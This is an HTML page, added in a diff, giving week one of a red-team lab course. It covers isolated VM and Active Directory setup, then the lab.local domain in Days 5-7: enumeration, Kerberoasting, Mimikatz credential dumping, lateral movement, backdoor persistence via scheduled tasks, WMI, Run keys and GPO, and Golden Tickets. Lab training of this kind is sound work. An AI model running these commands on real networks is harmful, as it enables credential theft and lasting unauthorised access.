@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 1 - Foundation & Setup | 30-Day Hybrid Cybersecurity Lab Plan</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            color: #374151;
+        }
+        .container {
+            max-width: 900px;
+        }
+        .day-card {
+            background-color: #ffffff;
+            border-radius: 0.75rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .day-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 0.75rem;
+        }
+        .goal-text {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #4b5563;
+            margin-bottom: 1rem;
+        }
+        .step-heading {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-top: 1rem;
+            margin-bottom: 0.5rem;
+        }
+        .checklist-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        .checklist-icon {
+            color: #10b981;
+            margin-right: 0.5rem;
+            font-size: 1.25rem;
+        }
+        a {
+            color: #2563eb;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 2rem 0;
+        }
+        .nav-button {
+            padding: 0.75rem 1.5rem;
+            background-color: #2563eb;
+            color: white;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            transition: background-color 0.2s;
+        }
+        .nav-button:hover {
+            background-color: #1d4ed8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body class="p-4 sm:p-8">
+    <div class="container mx-auto">
+        <header class="text-center mb-10">
+            <h1 class="text-4xl sm:text-5xl font-extrabold text-gray-900 mb-4 rounded-xl p-4 bg-white shadow-lg">
+                Week 1: Foundation & Setup
+            </h1>
+            <p class="text-xl text-gray-700 leading-relaxed">
+                Days 1-7 focus on establishing your cybersecurity lab environment, configuring Active Directory, and learning fundamental red team techniques including enumeration, privilege escalation, and persistence.
+            </p>
+        </header>
+
+        <div class="nav-buttons">
+            <a href="cyber-index.html" class="nav-button">← Back to Index</a>
+            <a href="cyber-week2.html" class="nav-button">Week 2 →</a>
+        </div>
+
+        <!-- Day 1 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day1.html">Day 1 — Install Kali Linux Attacker VM</a></h2>
+            <p class="goal-text">
+                Goal: Install VirtualBox or VMware and set up a Kali Linux attacker VM with secure, isolated networking and a static IP for predictable lab operations.
+            </p>
+            <h3 class="step-heading">Step 1 — Install Your Virtualization Platform</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Option A: <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank">VirtualBox Download</a> (Free, lightweight)</li>
+                <li>Option B: <a href="https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html" target="_blank">VMware Workstation Player</a> (Free for non-commercial use, smoother performance)</li>
+            </ul>
+            <h3 class="step-heading">Step 2 — Download Kali Linux</h3>
+            <p class="ml-4">
+                Get the latest <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">Kali Linux VirtualBox or VMware image</a>. Download the image that matches your virtualization software.
+            </p>
+            <h3 class="step-heading">Step 3 — Import Kali into Your Virtualization Software</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>In VirtualBox: File → Import Appliance → select the .ova file.</li>
+                <li>In VMware: Open a Virtual Machine → select the .vmx file.</li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Initial Setup</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Boot Kali and log in: Username: <code class="bg-gray-100 p-1 rounded">kali</code> Password: <code class="bg-gray-100 p-1 rounded">kali</code></li>
+                <li>Update your system:<br><code class="bg-gray-100 p-1 rounded">sudo apt update && sudo apt upgrade -y</code></li>
+                <li>Install common tools:<br><code class="bg-gray-100 p-1 rounded">sudo apt install bloodhound neo4j crackmapexec impacket-scripts -y</code></li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Configure Host-Only Networking</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Create a Host-Only network in VirtualBox or VMware.</li>
+                <li>Assign Kali a static IP (e.g., 192.168.56.10, subnet 255.255.255.0, no gateway).</li>
+                <li>Ensure Windows VMs will be in the same subnet later for direct communication.</li>
+            </ul>
+            <h3 class="step-heading">Completion Checklist:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Virtualization software installed</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Kali Linux VM imported and updated</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Host-Only network created and Kali assigned a static IP</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Internet access blocked from lab network</div>
+            </div>
+        </div>
+
+        <!-- Day 2 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day2.html">Day 2 — Install & Configure Windows 10 Target VM</a></h2>
+            <p class="goal-text">
+                Goal: Set up a Windows 10 Pro target machine with a static IP from the lab plan and verify connectivity with the Kali attacker machine.
+            </p>
+            <h3 class="step-heading">Step 1 — Download Windows 10 ISO</h3>
+            <p class="ml-4">
+                Official ISO from Microsoft: <a href="https://www.microsoft.com/software-download/windows10ISO" target="_blank">https://www.microsoft.com/software-download/windows10ISO</a><br>
+                Choose <code class="bg-gray-100 p-1 rounded">Windows 10 64-bit</code>.
+            </p>
+            <h3 class="step-heading">Step 2 — Create the VM</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>VirtualBox: New VM → Name: <code class="bg-gray-100 p-1 rounded">Win10-Target</code> → Type: <code class="bg-gray-100 p-1 rounded">Microsoft Windows</code> → Version: <code class="bg-gray-100 p-1 rounded">Windows 10 (64-bit)</code><br>
+                RAM: 2 GB minimum (4 GB recommended), Disk: 40 GB+</li>
+                <li>VMware: Create New Virtual Machine → Installer disc image (ISO) → Choose ISO<br>
+                Similar RAM and disk allocation</li>
+            </ul>
+            <h3 class="step-heading">Step 3 — Configure Networking</h3>
+            <p class="ml-4">
+                Use only <code class="bg-gray-100 p-1 rounded">one network adapter</code> set to <code class="bg-gray-100 p-1 rounded">Host-Only</code> (VirtualBox) or your chosen Host-Only network (VMware) to ensure isolation from the internet.
+            </p>
+            <h3 class="step-heading">Step 4 — Install Windows 10</h3>
+            <p class="ml-4">
+                Boot from the ISO and follow installation prompts.<br>
+                If asked for a product key, select <code class="bg-gray-100 p-1 rounded">I don't have a product key</code>.<br>
+                Choose <code class="bg-gray-100 p-1 rounded">Windows 10 Pro</code> for additional administrative and domain features.
+            </p>
+            <h3 class="step-heading">Step 5 — Assign Static IP</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>IP: <code class="bg-gray-100 p-1 rounded">192.168.56.11</code></li>
+                <li>Subnet Mask: <code class="bg-gray-100 p-1 rounded">255.255.255.0</code></li>
+                <li>Default Gateway: <code class="bg-gray-100 p-1 rounded">leave blank</code></li>
+                <li>Preferred DNS Server: <code class="bg-gray-100 p-1 rounded">192.168.56.20</code> (future AD server)</li>
+                <li>Path: Control Panel → Network and Sharing Center → Change adapter settings → Right-click adapter → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties</li>
+            </ul>
+            <h3 class="step-heading">Step 6 — Test Connectivity</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>From <code class="bg-gray-100 p-1 rounded">Windows</code>:<br><code class="bg-gray-100 p-1 rounded">ping 192.168.56.10</code></li>
+                <li>From <code class="bg-gray-100 p-1 rounded">Kali</code>:<br><code class="bg-gray-100 p-1 rounded">ping 192.168.56.11</code></li>
+            </ul>
+            <p class="ml-4">
+                Both should succeed. Pinging 8.8.8.8 should fail, confirming no internet access.
+            </p>
+            <h3 class="step-heading">End of Day 2 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Windows 10 Pro VM installed</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Static IP assigned</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Communication with Kali verified</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Lab remains isolated from the internet</div>
+            </div>
+        </div>
+
+        <!-- Day 3 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day3.html">Day 3 — Install & Configure Windows Server 2019 with Active Directory</a></h2>
+            <p class="goal-text">
+                Goal: Set up a Windows Server 2019 machine as a Domain Controller (DC) with DNS for your lab's Active Directory environment, assign it the static IP from the plan, and ensure it communicates with Kali and the Windows 10 target.
+            </p>
+            <h3 class="step-heading">Step 1 — Download Windows Server 2019 ISO</h3>
+            <p class="ml-4">
+                Official ISO from Microsoft Evaluation Center: <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019" target="_blank">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019</a><br>
+                Choose the ISO file, <code class="bg-gray-100 p-1 rounded">Standard or Datacenter</code> edition.
+            </p>
+            <h3 class="step-heading">Step 2 — Create the VM</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>VirtualBox: New VM → Name: <code class="bg-gray-100 p-1 rounded">Win2019-AD</code> → Type: <code class="bg-gray-100 p-1 rounded">Microsoft Windows</code> → Version: <code class="bg-gray-100 p-1 rounded">Windows 2019 (64-bit)</code><br>
+                RAM: 2–4 GB (more if running multiple services), Disk: 40 GB+</li>
+                <li>VMware: Create New Virtual Machine → Installer disc image (ISO) → Choose ISO<br>
+                Same RAM and disk allocation</li>
+            </ul>
+            <h3 class="step-heading">Step 3 — Configure Networking</h3>
+            <p class="ml-4">
+                Single network adapter on <code class="bg-gray-100 p-1 rounded">Host-Only</code> network. This matches the IP plan's isolated lab network.
+            </p>
+            <h3 class="step-heading">Step 4 — Install Windows Server 2019</h3>
+            <p class="ml-4">
+                Boot from ISO<br>
+                Select <code class="bg-gray-100 p-1 rounded">Windows Server 2019 Standard (Desktop Experience)</code><br>
+                Follow prompts to create an admin password
+            </p>
+            <h3 class="step-heading">Step 5 — Assign Static IP</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>IP: <code class="bg-gray-100 p-1 rounded">192.168.56.20</code></li>
+                <li>Subnet Mask: <code class="bg-gray-100 p-1 rounded">255.255.255.0</code></li>
+                <li>Default Gateway: <code class="bg-gray-100 p-1 rounded">leave blank</code></li>
+                <li>Preferred DNS Server: <code class="bg-gray-100 p-1 rounded">127.0.0.1</code> (it will be the DNS server)</li>
+                <li>Path: Control Panel → Network and Sharing Center → Change adapter settings → Right-click adapter → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties</li>
+            </ul>
+            <h3 class="step-heading">Step 6 — Install Active Directory Domain Services (AD DS)</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Open <code class="bg-gray-100 p-1 rounded">Server Manager</code></li>
+                <li>Click <code class="bg-gray-100 p-1 rounded">Add roles and features</code></li>
+                <li>Choose <code class="bg-gray-100 p-1 rounded">Role-based or feature-based installation</code></li>
+                <li>Select <code class="bg-gray-100 p-1 rounded">Active Directory Domain Services</code></li>
+                <li>Accept dependencies and install</li>
+            </ul>
+            <h3 class="step-heading">Step 7 — Promote Server to Domain Controller</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>In Server Manager, click the yellow warning flag → <code class="bg-gray-100 p-1 rounded">Promote this server to a domain controller</code></li>
+                <li>Create a <code class="bg-gray-100 p-1 rounded">new forest</code>: Root domain name: <code class="bg-gray-100 p-1 rounded">lab.local</code></li>
+                <li>Set a Directory Services Restore Mode (DSRM) password</li>
+                <li>Accept defaults for DNS and NetBIOS</li>
+                <li>Install and reboot</li>
+            </ul>
+            <h3 class="step-heading">Step 8 — Verify & Test</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>From <code class="bg-gray-100 p-1 rounded">Windows 10 Target</code>:<br><code class="bg-gray-100 p-1 rounded">ping 192.168.56.20</code><br><code class="bg-gray-100 p-1 rounded">nslookup lab.local</code></li>
+                <li>From <code class="bg-gray-100 p-1 rounded">Kali</code>:<br><code class="bg-gray-100 p-1 rounded">ping 192.168.56.20</code></li>
+            </ul>
+            <p class="ml-4">
+                Ensure both Windows machines can resolve domain names via the AD server's DNS.
+            </p>
+            <h3 class="step-heading">End of Day 3 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Server 2019 installed with Desktop Experience</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Static IP assigned</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>AD DS installed and server promoted to DC</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>DNS functioning within the lab</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Connectivity confirmed between Kali, Windows 10, and Server 2019</div>
+            </div>
+        </div>
+
+        <!-- Day 4 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day4.html">Day 4 — Join Windows 10 Target to the Active Directory Domain</a></h2>
+            <p class="goal-text">
+                Goal: Connect the Windows 10 Pro target machine to the lab.local domain hosted on your Windows Server 2019 Domain Controller, verify domain membership, and prepare for Active Directory enumeration.
+            </p>
+            <h3 class="step-heading">Step 1 — Set Windows 10 DNS to the Domain Controller</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On the Windows 10 target: Go to <code class="bg-gray-100 p-1 rounded">Control Panel → Network and Sharing Center → Change adapter settings</code></li>
+                <li>Right-click the Host-Only adapter → <code class="bg-gray-100 p-1 rounded">Properties</code></li>
+                <li>Select <code class="bg-gray-100 p-1 rounded">Internet Protocol Version 4 (TCP/IPv4)</code> → <code class="bg-gray-100 p-1 rounded">Properties</code></li>
+                <li>Set: Preferred DNS Server: <code class="bg-gray-100 p-1 rounded">192.168.56.20</code> (DC's IP)</li>
+                <li>Alternate DNS: <code class="bg-gray-100 p-1 rounded">leave blank</code></li>
+            </ul>
+            <h3 class="step-heading">Step 2 — Join the Domain</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Press Win + R, type <code class="bg-gray-100 p-1 rounded">sysdm.cpl</code>, and press Enter</li>
+                <li>Go to the <code class="bg-gray-100 p-1 rounded">Computer Name</code> tab</li>
+                <li>Click <code class="bg-gray-100 p-1 rounded">Change…</code></li>
+                <li>Under <code class="bg-gray-100 p-1 rounded">Member of</code>, select <code class="bg-gray-100 p-1 rounded">Domain</code> and enter: <code class="bg-gray-100 p-1 rounded">lab.local</code></li>
+                <li>Click <code class="bg-gray-100 p-1 rounded">OK</code></li>
+                <li>When prompted, enter the domain admin username and password created on the DC during Day 3</li>
+                <li>If successful, you'll see a "Welcome to the lab.local domain" message</li>
+            </ul>
+            <h3 class="step-heading">Step 3 — Restart the Windows 10 Target</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Reboot is required to apply domain membership changes</li>
+                <li>At the login screen, click <code class="bg-gray-100 p-1 rounded">Other user</code> and log in using a domain account:<br><code class="bg-gray-100 p-1 rounded">lab\\Administrator</code><code class="bg-gray-100 p-1 rounded">&lt;password&gt;</code></li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Verify Domain Membership</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Open Command Prompt and run:<br><code class="bg-gray-100 p-1 rounded">systeminfo | findstr /B /C:"Domain"</code></li>
+                <li>You should see:<br><code class="bg-gray-100 p-1 rounded">Domain: lab.local</code></li>
+                <li>You can also run:<br><code class="bg-gray-100 p-1 rounded">whoami</code><br>and confirm the format: <code class="bg-gray-100 p-1 rounded">lab\\username</code></li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Test Connectivity</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Ping DC by hostname:<br><code class="bg-gray-100 p-1 rounded">ping win2019-ad.lab.local</code></li>
+                <li>Run DNS resolution check:<br><code class="bg-gray-100 p-1 rounded">nslookup win2019-ad.lab.local</code></li>
+            </ul>
+            <h3 class="step-heading">End of Day 4 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Windows 10 target is joined to lab.local</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>DNS points to DC (192.168.56.20)</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Domain logins work</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Hostname and DNS resolution confirmed</div>
+            </div>
+        </div>
+
+        <!-- Day 5 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day5.html">Day 5 — Active Directory Enumeration with BloodHound & PowerView</a></h2>
+            <p class="goal-text">
+                Goal: Use your Kali attacker machine to perform your first domain reconnaissance against the lab.local environment, mapping relationships and identifying attack paths.
+            </p>
+            <h3 class="step-heading">Step 1 — Prepare Kali for BloodHound</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Start <code class="bg-gray-100 p-1 rounded">Neo4j</code> database:<br><code class="bg-gray-100 p-1 rounded">sudo neo4j console</code><br>Default login: <code class="bg-gray-100 p-1 rounded">neo4j / neo4j</code> (you will be prompted to change this)</li>
+                <li>Launch BloodHound:<br><code class="bg-gray-100 p-1 rounded">bloodhound &</code></li>
+            </ul>
+            <h3 class="step-heading">Step 2 — Collect Data with SharpHound</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Copy SharpHound.exe from Kali to the Windows 10 target:<br><code class="bg-gray-100 p-1 rounded">sudo cp /usr/share/bloodhound/collectors/SharpHound.exe /var/www/html/</code><br>(or share via SMB/HTTP)</li>
+                <li>On Windows 10 (as a domain user), run:<br><code class="bg-gray-100 p-1 rounded">.\SharpHound.exe -c All</code><br>This will create a .zip file with collected data.</li>
+                <li>Transfer the .zip back to Kali.</li>
+            </ul>
+            <h3 class="step-heading">Step 3 — Import Data into BloodHound</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>In BloodHound GUI, log in with your Neo4j credentials.</li>
+                <li>Drag and drop the SharpHound .zip into the interface.</li>
+                <li>Explore built-in queries like:
+                    <ul class="list-disc list-inside ml-4">
+                        <li>"Find all Domain Admins"</li>
+                        <li>"Shortest paths to Domain Admins"</li>
+                        <li>"Users with unconstrained delegation"</li>
+                    </ul>
+                </li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Enumerate with PowerView</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On the Windows 10 target (domain joined), load PowerView:<br><code class="bg-gray-100 p-1 rounded">Import-Module .\PowerView.ps1</code></li>
+                <li>Useful commands:
+                    <ul class="list-disc list-inside ml-4">
+                        <li>Get current domain info:<br><code class="bg-gray-100 p-1 rounded">Get-Domain</code></li>
+                        <li>List domain users:<br><code class="bg-gray-100 p-1 rounded">Get-DomainUser</code></li>
+                        <li>List domain computers:<br><code class="bg-gray-100 p-1 rounded">Get-DomainComputer</code></li>
+                        <li>List domain groups:<br><code class="bg-gray-100 p-1 rounded">Get-DomainGroup</code></li>
+                    </ul>
+                </li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Document Findings</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Record any high-value accounts, misconfigurations, or interesting group memberships.</li>
+                <li>Note shortest attack paths from BloodHound for later exploitation.</li>
+            </ul>
+            <h3 class="step-heading">End of Day 5 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>SharpHound executed and data imported into BloodHound</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>PowerView used to enumerate domain users, computers, and groups</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>At least one potential attack path identified</div>
+            </div>
+        </div>
+
+        <!-- Day 6 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day6.html">Day 6 — Domain Privilege Escalation</a></h2>
+            <p class="goal-text">
+                Goal: Leverage enumeration results from Day 5 to escalate privileges within the lab.local domain, moving toward Domain Admin access.
+            </p>
+            <h3 class="step-heading">Step 1 — Review BloodHound Data</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Reopen your BloodHound session from Day 5.</li>
+                <li>Look for attack paths leading from your current user to high-value targets (e.g., Domain Admins).</li>
+                <li>Common findings to focus on:
+                    <ul class="list-disc list-inside ml-4">
+                        <li>Users with <code class="bg-gray-100 p-1 rounded">GenericAll</code> or <code class="bg-gray-100 p-1 rounded">GenericWrite</code> on high-privilege groups.</li>
+                        <li>Computers with <code class="bg-gray-100 p-1 rounded">Local Admin rights</code> you can access.</li>
+                        <li>Accounts with <code class="bg-gray-100 p-1 rounded">Kerberoastable service tickets</code>.</li>
+                    </ul>
+                </li>
+            </ul>
+            <h3 class="step-heading">Step 2 — Exploit Kerberoastable Accounts</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>From Kali, request service tickets:<br><code class="bg-gray-100 p-1 rounded">GetUserSPNs.py lab.local/&lt;user&gt;@lab.local -dc-ip 192.168.56.20</code></li>
+                <li>Crack tickets with Hashcat or John the Ripper:<br><code class="bg-gray-100 p-1 rounded">hashcat -m 13100 hash.txt rockyou.txt</code></li>
+                <li>If successful, use the cracked password for further access.</li>
+            </ul>
+            <h3 class="step-heading">Step 3 — Abuse Delegation Rights</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>If BloodHound flags <code class="bg-gray-100 p-1 rounded">unconstrained delegation</code>: Gain access to the host. Monitor for TGTs of privileged users.</li>
+                <li>For <code class="bg-gray-100 p-1 rounded">constrained delegation</code>, attempt S4U2Self abuse with tools like Rubeus.</li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Lateral Movement to Privileged Systems</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Use valid credentials to connect via:<br><code class="bg-gray-100 p-1 rounded">crackmapexec smb 192.168.56.x -u &lt;user&gt; -p &lt;pass&gt; --shares</code></li>
+                <li>Deploy PsExec or WinRM (evil-winrm) to access target systems where you have admin rights.</li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Escalate to Domain Admin</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Once on a host with high privileges, dump credentials from LSASS:<br><code class="bg-gray-100 p-1 rounded">Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"</code></li>
+                <li>Use captured credentials to access the Domain Controller.</li>
+            </ul>
+            <h3 class="step-heading">Step 6 — Document the Attack Path</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Record each step from initial user to Domain Admin.</li>
+                <li>Save commands, outputs, and any cracked credentials for reference.</li>
+            </ul>
+            <h3 class="step-heading">End of Day 6 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>At least one successful privilege escalation path executed</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Domain Admin or equivalent high-level access achieved</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>Full attack chain documented</div>
+            </div>
+        </div>
+
+        <!-- Day 7 -->
+        <div class="day-card">
+            <h2 class="day-title"><a href="cyber-week1-day7.html">Day 7 — Domain Persistence Techniques</a></h2>
+            <p class="goal-text">
+                Goal: Implement persistence mechanisms in the lab.local environment to maintain access after credential changes or reboots, covering both local and domain-level techniques.
+            </p>
+            <h3 class="step-heading">Step 1 — Scheduled Tasks for Persistence</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On a compromised machine, create a scheduled task to run your payload:<br><code class="bg-gray-100 p-1 rounded">schtasks /create /sc onlogon /tn "Updater" /tr "C:\\Windows\\System32\\backdoor.exe" /ru SYSTEM</code></li>
+                <li>Verify with:<br><code class="bg-gray-100 p-1 rounded">schtasks /query /tn "Updater"</code></li>
+            </ul>
+            <h3 class="step-heading">Step 2 — WMI Event Subscription</h3>
+            <pre class="bg-gray-100 p-2 rounded-md overflow-x-auto text-sm ml-4">
+<code class="text-gray-800">$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='LogonTrigger';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"}
+$Consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='PayloadConsumer';CommandLineTemplate='C:\\Windows\\System32\\backdoor.exe'}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}</code>
+            </pre>
+            <p class="ml-4">This survives reboots and runs as SYSTEM.</p>
+            <h3 class="step-heading">Step 3 — Registry Run Keys</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>Add a persistence entry to run on logon:<br><code class="bg-gray-100 p-1 rounded">reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"</code></li>
+            </ul>
+            <h3 class="step-heading">Step 4 — Domain Group Policy Logon Script</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>On the Domain Controller: Open <code class="bg-gray-100 p-1 rounded">Group Policy Management</code></li>
+                <li>Edit the Default Domain Policy</li>
+                <li>Navigate to <code class="bg-gray-100 p-1 rounded">User Configuration → Windows Settings → Scripts (Logon/Logoff)</code></li>
+                <li>Add your script to execute at user logon across the domain</li>
+            </ul>
+            <h3 class="step-heading">Step 5 — Golden Ticket Persistence (Advanced)</h3>
+            <ul class="list-disc list-inside ml-4">
+                <li>If you have KRBTGT hash from DC, create a Golden Ticket with Mimikatz:<br><code class="bg-gray-100 p-1 rounded">mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:&lt;Domain_SID&gt; /krbtgt:&lt;KRBTGT_hash&gt; /id:500</code></li>
+                <li>Inject the ticket into your session:<br><code class="bg-gray-100 p-1 rounded">mimikatz # kerberos::ptt &lt;ticket.kirbi&gt;</code></li>
+            </ul>
+            <p class="ml-4">Grants indefinite domain access until KRBTGT password is reset twice.</p>
+            <h3 class="step-heading">End of Day 7 Success Criteria:</h3>
+            <div class="ml-4">
+                <div class="checklist-item"><span class="checklist-icon">✅</span>At least two persistence mechanisms implemented and tested</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>One domain-level persistence method working across multiple hosts</div>
+                <div class="checklist-item"><span class="checklist-icon">✅</span>All methods documented with steps for both deployment and removal</div>
+            </div>
+        </div>
+
+        <div class="nav-buttons">
+            <a href="cyber-index.html" class="nav-button">← Back to Index</a>
+            <a href="cyber-week2.html" class="nav-button">Week 2 →</a>
+        </div>
+
+        <footer class="mt-12 text-center text-gray-600">
+            <p>&copy; 2024 Hybrid Cybersecurity Lab Plan. All rights reserved.</p>
+        </footer>
+    </div>
+</body>
+</html>
